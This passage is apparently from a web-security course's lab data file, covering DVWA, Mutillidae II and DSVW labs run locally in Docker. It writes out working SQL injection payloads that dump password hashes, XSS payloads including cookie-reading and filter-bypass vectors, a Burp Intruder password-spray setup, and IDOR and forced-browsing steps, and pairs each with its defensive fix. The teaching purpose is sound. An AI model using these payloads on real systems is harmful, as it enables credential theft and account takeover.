      `Right-click the intercepted request and choose 'Send to Repeater' to keep a copy for later, then modify the password parameter's value directly in the Intercept view`,
      `Click Forward to send the tampered request and observe DVWA's response (invalid login message)`,
      `Repeat once more with Intercept off to compare normal end-to-end traffic against the intercepted/tampered version`,
      `Screenshot the intercepted request showing your edited password parameter before you clicked Forward`,
    ],
    resources: [
      {
        title: "DVWA GitHub repository",
        url: "https://github.com/digininja/DVWA",
        type: "tool",
      },
      {
        title: "DVWA container image (GHCR)",
        url: "https://github.com/digininja/DVWA/pkgs/container/dvwa",
        type: "tool",
      },
      {
        title: "PortSwigger: Using Burp Proxy",
        url: "https://portswigger.net/burp/documentation/desktop/getting-started/proxy-intercept-traffic",
        type: "link",
      },
      {
        title: "OWASP Testing Guide",
        url: "https://owasp.org/www-project-web-security-testing-guide/",
        type: "link",
      },
    ],
    completionIndicator: `Screenshot of Burp's Proxy > Intercept panel showing the raw DVWA login POST request with the password parameter visibly edited to a different value, prior to clicking Forward.`,
    dockerImage: "ghcr.io/digininja/dvwa:latest",
    containerPort: 80,
    slides: [
      {
        title: "Stand up DVWA in Docker",
        body: "DVWA is pulled and run with docker run -d --name dvwa -p 8080:80 ghcr.io/digininja/dvwa:latest, mapping container port 80 to host port 8080, then the database is initialized via 'Create / Reset Database' and Security Level is set to Low.",
        diagram: {
          type: "container-arch",
          hostLabel: "localhost:8080",
          containerLabel: "dvwa container",
          image: "ghcr.io/digininja/dvwa:latest",
          hostPort: 8080,
          containerPort: 80,
        },
      },
      {
        title: "Capture the raw login POST",
        body: "With FoxyProxy enabled and Proxy > Intercept switched on, logging out and resubmitting the DVWA login form catches the raw POST request in Burp before it reaches the server, exposing the username and password parameters plus the PHPSESSID cookie.",
        diagram: {
          type: "request-response",
          leftLabel: "Firefox",
          rightLabel: "Burp Intercept",
          exchanges: [
            {
              direction: "right",
              label: "POST /login.php",
              payload:
                "username=admin&password=password; Cookie: PHPSESSID=...",
            },
          ],
        },
      },
      {
        title: "Tamper the password and forward",
        body: "The intercepted request is sent to Repeater to keep a copy, then the password parameter's value is edited directly in the Intercept view before clicking Forward -- DVWA responds with an invalid login message, confirming the tampered request reached the server exactly as edited.",
        diagram: {
          type: "request-response",
          leftLabel: "Burp Intercept (edited)",
          rightLabel: "DVWA server",
          exchanges: [
            {
              direction: "right",
              label: "POST /login.php (tampered)",
              payload: "password=<edited value>",
            },
            {
              direction: "left",
              label: "302 / login page",
              payload: "invalid login message",
            },
          ],
        },
      },
      {
        title: "Compare intercepted vs passthrough",
        body: "Repeating the same login once more with Intercept off shows normal end-to-end traffic with no pause, contrasting against the tampered version and proving Burp's intercept step is what gave you the edit window in the first place.",
        diagram: {
          type: "flow-chain",
          steps: [
            {
              label: "Intercept ON",
              detail: "request paused, password edited, Forward clicked",
            },
            {
              label: "Intercept OFF",
              detail: "request passes straight through unmodified",
            },
          ],
        },
      },
      {
        title: "What you just proved",
        body: "Editing a live request in Intercept showed that DVWA's login form is only a suggestion -- the server accepts whatever arrives on the wire, not what the browser UI would normally allow. That is the same primitive behind parameter-tampering and business-logic bugs found on real engagements.",
      },
    ],
    hints: [
      "If Intercept isn't showing you a login POST, check what state you're actually in on the DVWA page before you submit the form.",
      "Intercept only catches a fresh login POST if you're actually looking at the login form when you submit -- that means logging out first, with Intercept already switched on before you submit.",
      "Log out of DVWA, set Proxy > Intercept to 'Intercept is on', then resubmit the login form -- the raw POST with username, password, and PHPSESSID will land in the Intercept tab for you to edit.",
    ],
  },
  {
    id: "L22",
    number: 22,
    week: 8,
    moduleId: "m8",
    title: "Burp Repeater: manual SQLi test on DVWA",
    description:
      "SQL injection still routinely turns a single unsanitized input field into a full database dump, and DVWA's SQL Injection page -- deliberately vulnerable across three difficulty levels -- mirrors exactly that failure mode. This lab uses Burp Repeater to manually break the WHERE clause with 1' OR '1'='1, find the column count with an ORDER BY probe, and build a UNION SELECT payload that pulls password hashes straight out of the users table, then repeats the attack against DVWA's Medium and High filters, adapting the payload as quotes get stripped and input gets restricted to a numeric-only pattern. Working through all three levels by hand builds the exact discipline real-world SQLi hunting requires: form a hypothesis, send one modified request, read the response diff, adjust. You come away able to manually fingerprint and exploit a SQL injection point without leaning on an automated scanner.",
    objective:
      "Use Burp Repeater to manually break DVWA's SQL Injection WHERE clause, find the column count, and run a UNION SELECT to dump password hashes, then adapt the payload across the Low, Medium, and High filters.",
    successCriteria: [
      "Repeater response pane shows the SQLi page returning user password hashes via a successful UNION payload (at least at Low)",
      "Column count determined with an ORDER BY probe before building the UNION",
      "Attack repeated at Medium and High, noting the filtering and how the payload was adapted",
      "A one-line summary per level records the payload used and whether it succeeded",
    ],
    platform: "Burp Suite",
    difficulty: "medium",
    estimatedHours: 2,
    instructions: [
      `Run DVWA in Docker (docker run -d --name dvwa -p 8080:80 ghcr.io/digininja/dvwa:latest), create the database, log in as admin/password, and set Security Level to Low`,
      `Open DVWA's SQL Injection page, submit User ID '1', capture the request in Burp Proxy, and send it to Repeater (Ctrl+R)`,
      `In Repeater, change the id parameter to 1' OR '1'='1 and send it; note that all users are returned instead of just user 1`,
      `Determine the column count with an ORDER BY probe: 1' ORDER BY 3-- - , increasing the number until the query errors`,
      `Once the column count is known, build a UNION payload, e.g. 1' UNION SELECT user, password FROM users-- - , and confirm the password hashes appear in the response`,
      `Use Repeater's 'Ctrl+U' URL-encode-selection shortcut on the payload before sending if DVWA rejects an un-encoded space or comment sequence`,
      `Switch DVWA Security Level to Medium, repeat the same UNION payload, and note which characters/keywords are now filtered (e.g. stripped quotes) and how you adapt the payload`,
      `Switch to High, repeat again, and note the additional restriction (input must match a numeric regex) and the technique needed to bypass it`,
      `Save each Repeater request/response pair as evidence for Low, Medium, and High`,
      `Write a one-line summary per level: payload used, and whether it succeeded`,
    ],
    resources: [
      {
        title: "DVWA GitHub repository",
        url: "https://github.com/digininja/DVWA",
        type: "tool",
      },
      {
        title: "DVWA container image (GHCR)",
        url: "https://github.com/digininja/DVWA/pkgs/container/dvwa",
        type: "tool",
      },
      {
        title: "PayloadsAllTheThings: SQL Injection",
        url: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection",
        type: "link",
      },
      {
        title: "PortSwigger: Using Burp Repeater",
        url: "https://portswigger.net/burp/documentation/desktop/tools/repeater",
        type: "link",
      },
      {
        title: "OWASP SQL Injection Prevention Cheat Sheet",
        url: "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
        type: "link",
      },
    ],
    completionIndicator: `Burp Repeater response pane showing the DVWA SQL Injection page returning user password hashes via a successful UNION-based payload, captured for at least the Low security level.`,
    dockerImage: "ghcr.io/digininja/dvwa:latest",
    containerPort: 80,
    slides: [
      {
        title: "Send the SQLi request to Repeater",
        body: "Submitting User ID '1' on DVWA's SQL Injection page and capturing it in Burp Proxy, then sending it to Repeater (Ctrl+R), sets up a workspace for iterating on the id parameter one payload at a time.",
        diagram: {
          type: "request-response",
          leftLabel: "Browser",
          rightLabel: "Burp Repeater",
          exchanges: [
            {
              direction: "right",
              label: "GET /vulnerabilities/sqli/?id=1&Submit=Submit",
              payload: "id=1",
            },
          ],
        },
      },
      {
        title: "Break the WHERE clause (Low)",
        body: "Changing id to 1' OR '1'='1 returns every user instead of just user 1, confirming the input is concatenated directly into the SQL query with no sanitization.",
        diagram: {
          type: "request-response",
          leftLabel: "Repeater",
          rightLabel: "DVWA (Low)",
          exchanges: [
            {
              direction: "right",
              label: "id parameter",
              payload: "1' OR '1'='1",
            },
            {
              direction: "left",
              label: "200 OK",
              payload: "all users returned",
            },
          ],
        },
      },
      {
        title: "Find the column count, then UNION",
        body: "An ORDER BY 3-- - probe increments until the query errors to reveal the column count, after which 1' UNION SELECT user, password FROM users-- - is sent and the response contains the users table's password hashes.",
        diagram: {
          type: "flow-chain",
          steps: [
            {
              label: "ORDER BY 1, 2, 3...",
              detail: "increase until an error reveals the column count",
            },
            {
              label: "UNION SELECT user, password FROM users-- -",
              detail: "password hashes appear in the response",
            },
          ],
        },
      },
      {
        title: "Adapt at Medium and High",
        body: "At Medium, quotes are stripped, so the same UNION logic has to be re-encoded (Ctrl+U in Repeater) or restructured around the filter; at High, DVWA restricts input to a numeric regex, forcing a different delivery mechanism for the same UNION SELECT user, password FROM users payload.",
        diagram: {
          type: "request-response",
          leftLabel: "Repeater",
          rightLabel: "DVWA (Medium/High)",
          exchanges: [
            {
              direction: "right",
              label: "Medium: quotes stripped",
              payload: "payload re-encoded via Ctrl+U",
            },
            {
              direction: "right",
              label: "High: numeric-only regex",
              payload: "id must match numeric pattern",
            },
          ],
        },
      },
      {
        title: "What you just proved",
        body: "You went from a login form to raw password hashes using nothing but hand-crafted payloads and Repeater's response diff -- the exact workflow real pentesters use before ever reaching for an automated scanner. That manual discipline -- form a hypothesis, send one request, read the diff, adjust -- is what separates someone who can actually find SQLi from someone who only recognizes it in a report.",
      },
    ],
    hints: [
      "Before you try a UNION SELECT payload, make sure you've done the step that tells you how many columns the query is working with.",
      "An ORDER BY probe on the id parameter, increasing the number each time, will error out once you pass the actual column count -- that number is what your UNION payload needs to match.",
      "Send 1' ORDER BY 3-- - and keep raising the number until DVWA errors; the last number that didn't error is your column count, which you then use to size a UNION SELECT ... FROM users-- - payload against the id parameter.",
    ],
  },
  {
    id: "L23",
    number: 23,
    week: 8,
    moduleId: "m8",
    title: "Burp Intruder: password spray on DVWA",
    description:
      "Weak and reused passwords remain one of the most common ways real accounts get taken over, and password-spray attacks are exactly how attackers -- and authorized pentesters -- find them at scale. This lab points Burp Intruder's Sniper mode at DVWA's login form, marks only the password parameter, loads a short candidate list, and sets a Grep-Match rule that flags the one response where the login-failure string disappears. Sorting the results grid isolates the working credential far faster than checking each response by hand, and the lab makes explicit why the attack is practical at all: the endpoint never throttles or locks out repeated failures. You leave able to build an Intruder Sniper attack with a working success condition against any login form that lacks rate-limiting.",
    objective:
      "Build a Burp Intruder Sniper attack against DVWA's login form with a Grep-Match success condition to recover a working password from a candidate list without any rate-limiting stopping it.",
    successCriteria: [
      "Intruder results grid shows the Grep-Match column flagging exactly one row, confirmed as a working DVWA credential",
      "Only the password parameter marked, Attack type set to Sniper, with a simple-list payload set",
      "The recovered credential confirmed by manual login",
      "A note explains why the unthrottled login endpoint makes the attack practical",
    ],
    platform: "Burp Suite / DVWA",
    difficulty: "medium",
    estimatedHours: 2,
    instructions: [
      `Run DVWA in Docker, create the database, and log out so the login form is reachable`,
      `With Intercept on, submit the login form once to capture the raw POST request, then send it to Intruder (Ctrl+I)`,
      `In Intruder's Positions tab, clear all default payload markers, then mark only the password parameter's value and confirm Attack type is 'Sniper'`,
      `In the Payloads tab, choose payload set 1, type 'Simple list', and add a short list of common passwords (e.g. password, admin, password123, letmein, dvwa)`,
      `In the Options tab, add a Grep - Match rule for a string that appears only after a successful login (e.g. 'index.php' redirect text or 'Login failed' to invert the logic)`,
      `Click Start attack and let it run against all payloads in the list`,
      `Sort the results grid by the Grep-Match column to find the one request where the failure string is absent (or the success string is present)`,
      `Confirm the finding by logging in manually with that password`,
      `Document the working credential and note why an unthrottled login endpoint makes this attack practical`,
    ],
    resources: [
      {
        title: "DVWA GitHub repository",
        url: "https://github.com/digininja/DVWA",
        type: "tool",
      },
      {
        title: "DVWA container image (GHCR)",
        url: "https://github.com/digininja/DVWA/pkgs/container/dvwa",
        type: "tool",
      },
      {
        title: "PortSwigger: Using Burp Intruder",
        url: "https://portswigger.net/burp/documentation/desktop/tools/intruder",
        type: "link",
      },
      {
        title: "SecLists common passwords wordlists",
        url: "https://github.com/danielmiessler/SecLists/tree/master/Passwords/Common-Credentials",
        type: "link",
      },
    ],
    completionIndicator: `Screenshot of Burp Intruder's results grid with the Grep-Match column checked for exactly one row, and that row's payload confirmed as a working DVWA login credential.`,
    dockerImage: "ghcr.io/digininja/dvwa:latest",
    containerPort: 80,
    slides: [
      {
        title: "Stand up DVWA and capture the login POST",
        body: "DVWA runs in Docker (ghcr.io/digininja/dvwa:latest, container port 80); with Intercept on, submitting the login form once captures the raw POST, which is then sent to Intruder (Ctrl+I).",
        diagram: {
          type: "container-arch",
          hostLabel: "localhost:8080",
          containerLabel: "dvwa container",
          image: "ghcr.io/digininja/dvwa:latest",
          hostPort: 8080,
          containerPort: 80,
        },
      },
      {
        title: "Mark the password parameter (Sniper)",
        body: "In Intruder's Positions tab, all default payload markers are cleared and only the password parameter's value is marked, with Attack type left on 'Sniper' so each payload is tried one at a time in that single position.",
        diagram: {
          type: "request-response",
          leftLabel: "Intruder Positions",
          rightLabel: "DVWA login",
          exchanges: [
            {
              direction: "right",
              label: "POST /login.php",
              payload: "username=admin&password=§payload§",
            },
          ],
        },
      },
      {
        title: "Load the password list and grep for success",
        body: "A Simple list payload set of password, admin, password123, letmein, dvwa is added, and a Grep - Match rule is set on a string that only appears after a successful login (or 'Login failed' to invert the logic), so the results grid can be sorted for the one row where that condition flips.",
        diagram: {
          type: "request-response",
          leftLabel: "Intruder attack",
          rightLabel: "DVWA login",
          exchanges: [
            {
              direction: "right",
              label: "attempt 1",
              payload: "password",
            },
            {
              direction: "right",
              label: "attempt 2",
              payload: "admin",
            },
            {
              direction: "right",
              label: "attempt 3",
              payload: "password123",
            },
            {
              direction: "left",
              label: "Grep-Match hit",
              payload: "'Login failed' absent -> success",
            },
          ],
        },
      },
      {
        title: "Confirm the working credential",
        body: "Sorting by the Grep-Match column isolates the single successful row; logging in manually with that recovered password confirms the finding, and the whole attack is only practical because the login endpoint never throttled or locked out repeated attempts.",
      },
      {
        title: "Why this matters",
        body: "Intruder's Sniper attack with a Grep-Match rule turned a manual guessing game into an automated one in minutes. The only reason it worked is that DVWA's login endpoint never throttled or locked out repeated attempts -- the exact missing control that makes any login form vulnerable to this kind of attack.",
      },
    ],
    hints: [
      "If every row in your Intruder results looks identical, revisit the Options tab step -- you haven't told Burp how to tell success from failure yet.",
      "You need a Grep - Match rule keyed on a string that only appears (or disappears) on a successful login, then sort the results grid by that column to isolate the one hit.",
      "Add a Grep - Match rule for something like the 'Login failed' string (so its absence marks success), run the attack, then sort by the Grep-Match column to find the single row where that string is missing.",
    ],
  },
  {
    id: "L24",
    number: 24,
    week: 9,
    moduleId: "m9",
    title: "Mutillidae II: XSS across three contexts with the hint system",
    description:
      "Cross-site scripting shows up as reflected, persistent, and DOM-based -- three structurally different injection points that each need their own payload and their own fix. Mutillidae II is the OWASP target built for exactly this comparison: an adjustable security-level slider (0 = insecure, higher = filtered) and a built-in hint system on every page, all running locally with no external account. You drive the same attacker goal -- fire JavaScript and reach the session cookie -- through Mutillidae's three distinct XSS pages: Reflected (First Order) via an input echoed straight back, Persistent (Second Order) via a stored blog entry that fires for every later visitor, and DOM-Based where the payload never touches the server. Then you raise the security level and watch which payloads the filter now strips, adapting each one to an event-handler vector. Because the fix differs by context -- output encoding for reflected, stored-input sanitisation for persistent, a safe DOM sink for DOM-based -- you leave able to name which XSS you're facing and the exact defense it demands, not just fire one canned script tag.",
    objective:
      "Drive the same fire-JavaScript goal through Mutillidae II's Reflected, Persistent, and DOM-based XSS pages at level 0, then raise the security level and adapt each payload to an event-handler vector.",
    successCriteria: [
      "An alert() firing captured on each of the three XSS pages (Reflected First Order, Persistent Second Order, DOM-Based) at security level 0",
      "The stored payload confirmed firing for every blog viewer, not just the poster",
      "One screenshot shows a payload neutralised after raising the security level",
      "One sentence per context names its fix: output encoding, stored-input sanitisation, or a safe DOM sink",
    ],
    platform: "Mutillidae",
    difficulty: "medium",
    estimatedHours: 3,
    instructions: [
      `Click 'Start Lab' above, then browse to http://localhost:18080/ and, on first run only, visit http://localhost:18080/set-up-database.php and click the setup button to initialise Mutillidae's database`,
      `Confirm the top toolbar shows Security Level 0 and that hints are enabled (Toggle Hints), so you can lean on the built-in guidance for the first pass`,
      `Reflected XSS: open OWASP 2013 -> A3 - Cross Site Scripting (XSS) -> Reflected (First Order) (e.g. the DNS Lookup or User Lookup page), submit <script>alert(document.cookie)</script> in the input field, and confirm the alert fires from the reflected response`,
      `Persistent XSS: open A3 -> Persistent (Second Order) -> Add to your blog, post a blog entry containing <script>alert('stored')</script>, then reload View Blogs and confirm the script fires for every viewer of the blog, not just you`,
      `DOM-Based XSS: open A3 -> DOM-Based, inject a payload such as <img src=x onerror=alert('dom')> into the parameter that client-side JavaScript reads and writes into the DOM, and confirm it executes with no server round-trip`,
      `Raise the security level to 1 (then higher) from the toolbar and re-attempt each of the three payloads; note exactly what the filter now strips (e.g. the literal <script> tag) and adapt with an event-handler vector such as <svg onload=alert(1)> or <img src=x onerror=alert(1)>`,
      `For each of the three contexts, write one sentence naming the fix it needs: output encoding (reflected), stored-input sanitisation (persistent), or a safe DOM sink (DOM-based)`,
      `Screenshot each firing alert, plus one screenshot of a payload being neutralised after you raised the security level`,
    ],
    resources: [
      {
        title: "OWASP Mutillidae II (GitHub)",
        url: "https://github.com/webpwnized/mutillidae",
        type: "tool",
      },
      {
        title: "Mutillidae user guide (wiki)",
        url: "https://github.com/webpwnized/mutillidae/wiki",
        type: "link",
      },
      {
        title: "OWASP: Cross Site Scripting (XSS)",
        url: "https://owasp.org/www-community/attacks/xss/",
        type: "link",
      },
      {
        title: "OWASP XSS Prevention Cheat Sheet",
        url: "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html",
        type: "link",
      },
    ],
    completionIndicator: `Screenshots of an alert() firing on each of Mutillidae's three XSS pages -- Reflected (First Order), Persistent (Second Order), and DOM-Based -- at security level 0, plus one screenshot showing the same payload neutralised after the security level was raised.`,
    dockerImage: "citizenstig/nowasp",
    containerPort: 80,
    slides: [
      {
        title: "Set up Mutillidae and confirm level 0",
        body: "Mutillidae runs locally with no external account: browse to the target, run /set-up-database.php once, and confirm the toolbar shows Security Level 0 with hints enabled before touching any XSS page.",
        diagram: {
          type: "container-arch",
          hostLabel: "localhost:18080",
          containerLabel: "mutillidae container",
          image: "citizenstig/nowasp",
          hostPort: 18080,
          containerPort: 80,
        },
      },
      {
        title: "Reflected XSS (First Order)",
        body: "On a Reflected (First Order) page under A3 - Cross Site Scripting, submitting <script>alert(document.cookie)</script> reflects straight back into the HTML with no encoding, firing the alert from the response.",
        diagram: {
          type: "request-response",
          leftLabel: "Browser",
          rightLabel: "Mutillidae (reflected page)",
          exchanges: [
            {
              direction: "right",
              label: "GET /index.php?page=dns-lookup ...",
              payload: "<script>alert(document.cookie)</script>",
            },
            {
              direction: "left",
              label: "200 OK",
              payload: "payload reflected unencoded into the page",
            },
          ],
        },
      },
      {
        title: "Persistent XSS (Second Order)",
        body: "Posting a blog entry containing <script>alert('stored')</script> via Add to your blog persists the payload server-side, so it fires for every viewer who loads View Blogs -- not just the person who posted it.",
        diagram: {
          type: "browser-mockup",
          url: "/index.php?page=add-to-your-blog.php",
          annotations: [
            {
              label: "Blog entry field",
              note: "<script>alert('stored')</script> submitted as a normal blog post",
            },
            {
              label: "On View Blogs reload",
              note: "script executes automatically for any visitor of the blog",
            },
          ],
        },
      },
      {
        title: "DOM-Based XSS and raising the level",
        body: "A DOM-Based page reads a parameter into a client-side sink, so <img src=x onerror=alert('dom')> fires with no server round-trip. Raising the security level then strips the literal <script> tag, forcing an event-handler vector like <svg onload=alert(1)>.",
        diagram: {
          type: "comparison",
          columns: [
            {
              label: "Level 0",
              points: [
                "<script>alert(1)</script> fires on reflected and stored pages",
                "<img src=x onerror=...> fires client-side (DOM)",
              ],
            },
            {
              label: "Level raised",
              points: [
                "literal <script> tag stripped",
                "adapt to <svg onload=alert(1)> / <img src=x onerror=alert(1)>",
              ],
              highlighted: true,
            },
          ],
        },
      },
      {
        title: "Why this matters",
        body: "Three sinks -- unencoded reflection, a persistent stored blog entry, and a DOM write -- needed three different fixes: output encoding, stored-input sanitisation, and a safe DOM sink. 'XSS' is not one bug but a family of injection points, each demanding the defense matched to where the payload actually lands.",
      },
    ],
    hints: [
      "Nothing firing on first load? Make sure you ran /set-up-database.php once and that the toolbar Security Level is 0 with hints on before you touch the XSS pages.",
      "All three pages live under OWASP 2013 -> A3 - Cross Site Scripting (XSS): Reflected (First Order), Persistent (Second Order), and DOM-Based -- a plain <script> tag will fire on the first two at level 0.",
      "Once you raise the security level and <script> gets stripped, switch to an event-handler vector with no literal script tag, e.g. <svg onload=alert(1)> or <img src=x onerror=alert(1)>, and note which context needs which fix.",
    ],
  },
  {
    id: "L25",
    number: 25,
    week: 9,
    moduleId: "m9",
    title: "DSVW: raw-request SQL injection you can read the source for",
    description:
      "SQL injection is easiest to truly understand when you can see both the injected request and the exact line of code that mishandles it. Damn Small Vulnerable Web is a single ~100-line Python file, so this lab pairs a focused SQLi exploit with reading the very query that made it possible. Working entirely from raw HTTP (browser address bar, curl, or Burp -- DSVW has almost no UI to hide behind), you hit its SQLite-backed endpoint, break the WHERE clause, determine the column count, and run a UNION SELECT to dump the users table, then open DSVW's source to find the string-formatted query behind the bug and state the one-line fix. Because DSVW builds its query with naive Python string formatting and no parameterisation, the exploit and its root cause sit side by side. You leave able to exploit UNION-based SQLi from raw requests and point to the exact code pattern that caused it.",
    objective:
      "Exploit UNION-based SQL injection in DSVW from raw HTTP requests to dump the users table, then open its single-file source to point at the string-formatted query that caused it.",
    successCriteria: [
      "Raw HTTP response (browser or curl) shows DSVW returning username/password rows via a UNION-based payload",
      "Column count matched (four columns) after an incremental NULL probe",
      "The exact line of DSVW's Python source that builds the query via string formatting is identified",
      "Two sentences record the working UNION payload and the parameterised-query fix",
    ],
    platform: "DSVW",
    difficulty: "medium",
    estimatedHours: 4,
    instructions: [
      `Click 'Start Lab' above, then browse to http://localhost:18080/ to see DSVW's landing page listing its vulnerability categories, and locate the SQL injection endpoint (a request of the form /?id=1)`,
      `Send /?id=1 and note the normal single-row response -- this is the query you'll be manipulating`,
      `Break the WHERE clause with /?id=1 OR 1=1 (URL-encode the space as %20 if needed) and confirm more rows return than the single expected record`,
      `Determine the column count with a UNION probe -- /?id=1 UNION SELECT NULL-- , adding NULLs until the query stops erroring -- since DSVW's SQLite query has a fixed column count you must match`,
      `Once the column count matches, dump credentials with a UNION SELECT pulling the username and password columns from the users table -- DSVW's base query returns four columns (id, username, name, surname), so your UNION must select four too, e.g. /?id=-1 UNION SELECT NULL, username, password, NULL FROM users -- and record the returned rows`,
      `Open DSVW's single-file source (linked in Resources, or view it inside the container) and find the exact line that builds the SQL query with Python string formatting rather than a parameterised query`,
      `Write two sentences: the working UNION payload, and the one-line code change (a parameterised query with bound parameters) that would have prevented it`,
    ],
    resources: [
      {
        title: "DSVW (GitHub)",
        url: "https://github.com/appsecco/dsvw",
        type: "tool",
      },
      {
        title: "OWASP: SQL Injection",
        url: "https://owasp.org/www-community/attacks/SQL_Injection",
        type: "link",
      },
      {
        title: "OWASP SQL Injection Prevention Cheat Sheet",
        url: "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
        type: "link",
      },
      {
        title: "PayloadsAllTheThings: SQL Injection",
        url: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection",
        type: "link",
      },
    ],
    completionIndicator: `The raw HTTP response (browser or curl) showing DSVW returning username/password rows from a UNION-based SQL injection payload, paired with the specific line of DSVW's Python source that built the query via string formatting.`,
    dockerImage: "appsecco/dsvw",
    containerPort: 8000,
    slides: [
      {
        title: "One tiny app, read the source",
        body: "DSVW is a single small Python file, so the SQLi endpoint and the query behind it are both readable in one sitting. It has almost no UI -- the injection lives in a simple /?id= parameter you drive from the address bar or curl.",
        diagram: {
          type: "container-arch",
          hostLabel: "localhost:18080",
          containerLabel: "dsvw container",
          image: "appsecco/dsvw",
          hostPort: 18080,
          containerPort: 8000,
        },
      },
      {
        title: "Break the WHERE clause",
        body: "Sending /?id=1 OR 1=1 makes the WHERE clause always true, returning more rows than the single expected record -- confirming the id parameter is concatenated straight into the SQL query.",
        diagram: {
          type: "request-response",
          leftLabel: "Browser / curl",
          rightLabel: "DSVW (SQLite)",
          exchanges: [
            {
              direction: "right",
              label: "GET /?id=1 OR 1=1",
              payload: "1 OR 1=1",
            },
            {
              direction: "left",
              label: "200 OK",
              payload: "more rows than the single expected record",
            },
          ],
        },
      },
      {
        title: "Find the columns, then UNION-dump",
        body: "Adding NULLs to a UNION SELECT one at a time reveals the exact column count DSVW's query returns; matching it lets a UNION SELECT pull the username and password columns from the users table into the response.",
        diagram: {
          type: "flow-chain",
          steps: [
            {
              label: "/?id=1 UNION SELECT NULL-- ...",
              detail: "add NULLs until the error stops -> column count",
            },
            {
              label:
                "/?id=-1 UNION SELECT NULL, username, password, NULL FROM users",
              detail:
                "four columns matched; credentials dumped into the raw response",
            },
          ],
        },
      },
      {
        title: "Match the exploit to its source line",
        body: "Open DSVW's single source file and find the line that builds the SQL query with Python string formatting instead of a parameterised query -- the exploit and its root cause sit side by side in the same readable file.",
        diagram: {
          type: "comparison",
          columns: [
            {
              label: "Vulnerable",
              points: [
                "id concatenated/formatted into the SQL string",
                "attacker controls part of the query",
              ],
            },
            {
              label: "Fixed",
              points: [
                "parameterised query with bound parameters",
                "id treated as data, never as SQL",
              ],
              highlighted: true,
            },
          ],
        },
      },
      {
        title: "Why this matters",
        body: "UNION-based SQLi from raw requests is the loud, visible form of the same string-concatenation flaw behind blind and error-based variants. Reading DSVW's own source to point at the string-formatted query proves you can name the exact code pattern -- and the parameterised-query fix -- not just fire a payload.",
      },
    ],
    hints: [
      "DSVW has barely any UI -- the SQLi lives in a simple /?id= parameter; start by sending /?id=1 and watching the normal response before you change anything.",
      "Use OR 1=1 to confirm the WHERE clause is injectable, then add NULLs to a UNION SELECT one at a time until the error stops -- that tells you the exact column count you must match.",
      "With the column count known, replace the NULLs with the username and password columns from the users table, then open DSVW's single source file and find the string-formatted query that made all of this work.",
    ],
  },
  {
    id: "L26",
    number: 26,
    week: 9,
    moduleId: "m9",
    title: "Mutillidae II: IDOR and missing function-level access control",
    description:
      "Most broken-access-control bugs are one of two failures -- an object reference you can change to reach data that isn't yours, or a privileged page that is hidden rather than actually guarded. Mutillidae II has both, laid out under its OWASP category menu with a security-level slider and built-in hints, so you can prove each locally without cracking a single password. You exploit an Insecure Direct Object Reference by changing a user/account id parameter to view a record that isn't yours, then exploit Missing Function-Level Access Control by browsing straight to a privileged page whose only 'protection' was that the UI never linked to it. Then you raise the security level and confirm the same two requests are now rejected server-side, isolating exactly where the real fix belongs. Neither step guesses a credential -- the flaw is architectural, exactly like the real-world version -- so you leave able to tell access control that is merely obscured from access control that is actually enforced.",
    objective:
      "Exploit Mutillidae II's IDOR by tampering an id parameter and its missing function-level access control by forced-browsing to a privileged page, then raise the security level to confirm both are blocked server-side.",
    successCriteria: [
      "Screenshot shows another user's data returned after changing only an id/user parameter (IDOR), no victim login used",
      "Screenshot shows a privileged page reached directly by URL with no admin login",
      "Both requests confirmed rejected after raising the security level (two screenshots)",
      "One sentence per finding names the missing server-side check (ownership check; role check)",
    ],
    platform: "Mutillidae",
    difficulty: "medium",
    estimatedHours: 3,
    instructions: [
      `Click 'Start Lab' above, then browse to http://localhost:18080/ and, on first run only, visit http://localhost:18080/set-up-database.php and click the setup button; confirm the toolbar shows Security Level 0 with hints enabled`,
      `IDOR: open OWASP 2013 -> A4 - Insecure Direct Object References -> View Someone's Blog (or the view-user / account page), then change the user/blogger/id parameter in the request to another value and confirm you can read a record that isn't yours`,
      `Capture the request in Burp (or simply edit the URL) and show that ONLY the id parameter changed -- you never logged in as the victim`,
      `Missing Function-Level Access Control: open OWASP 2013 -> A7 - Missing Function Level Access Control and reach a privileged page (e.g. an admin / user-management or 'secret' page) directly by its URL, with no admin login`,
      `Raise the security level from the toolbar and re-send both requests; confirm the IDOR now returns only your own record and the privileged page now rejects the unauthenticated request`,
      `For each of the two findings, write one sentence naming the missing server-side check: an ownership check tying the id to your session (IDOR), and a role check on the privileged function (missing function-level access control)`,
      `Screenshot both successful accesses at level 0, plus the two rejections after you raised the level`,
    ],
    resources: [
      {
        title: "OWASP Mutillidae II (GitHub)",
        url: "https://github.com/webpwnized/mutillidae",
        type: "tool",
      },
      {
        title: "Mutillidae user guide (wiki)",
        url: "https://github.com/webpwnized/mutillidae/wiki",
        type: "link",
      },
      {
        title: "OWASP Broken Access Control (Top 10 A01)",
        url: "https://owasp.org/Top10/A01_2021-Broken_Access_Control/",
        type: "link",
      },
      {
        title: "OWASP Authorization Cheat Sheet",
        url: "https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html",
        type: "link",
      },
    ],
    completionIndicator: `Screenshots showing (a) another user's data returned after changing only an id/user parameter (IDOR) and (b) a privileged Mutillidae page reached directly by URL with no admin login, both at security level 0, plus confirmation that raising the security level blocks the same two requests.`,
    dockerImage: "citizenstig/nowasp",
    containerPort: 80,
    slides: [
      {
        title: "Two shapes of one flaw",
        body: "Broken access control here comes in two forms: an object reference you can change (IDOR) and a privileged page that is hidden rather than guarded (missing function-level access control). Both are provable at Mutillidae's security level 0 without cracking anything.",
        diagram: {
          type: "comparison",
          columns: [
            {
              label: "IDOR",
              points: [
                "id/user parameter is client-controlled",
                "change it to reach a record that isn't yours",
              ],
            },
            {
              label: "Missing function-level access control",
              points: [
                "privileged page only 'hidden' from the UI",
                "reach it directly by its URL, no admin login",
              ],
              highlighted: true,
            },
          ],
        },
      },
      {
        title: "IDOR by tampering the id",
        body: "Under A4 - Insecure Direct Object References, changing only the user/blogger/id parameter returns another user's record -- the server never checked that the id belonged to your session.",
        diagram: {
          type: "request-response",
          leftLabel: "Browser",
          rightLabel: "Mutillidae",
          exchanges: [
            {
              direction: "right",
              label: "GET ...view-someones-blog... id=1",
              payload: "your own record",
            },
            {
